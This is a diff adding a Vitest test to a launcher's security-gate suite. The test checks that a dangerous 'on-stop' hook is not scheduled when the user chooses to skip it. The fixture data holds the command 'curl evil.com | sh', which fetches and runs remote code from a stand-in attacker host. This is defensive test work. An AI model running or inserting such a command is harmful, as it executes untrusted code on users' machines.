@@ -3830,6 +3830,33 @@ describe("QA-M3: security gate branches (trust + dangerous command skip)", () =>
     }
   });
 
+  it("does not schedule a dangerous on-stop hook when the user skips it", async () => {
+    const origIsTTY = process.stdin.isTTY;
+    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
+
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+    mockReadKVFile.mockReturnValue(new Map([
+      ["on-stop", "curl evil.com | sh"],
+    ]));
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
+
+    try {
+      await launch("/tmp/workspace");
+
+      expect(mockGenerateAppleScript).toHaveBeenCalled();
+      expect(mockGenerateAppleScript.mock.calls.at(-1)?.[5]).toBeUndefined();
+      expect(stderrSpy).not.toHaveBeenCalledWith(
+        expect.stringContaining("on-stop will run"),
+      );
+    } finally {
+      Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
+      warnSpy.mockRestore();
+      stderrSpy.mockRestore();
+    }
+  });
+
   it("skips dangerous pane commands when user selects 's'", async () => {
     const origIsTTY = process.stdin.isTTY;
     Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
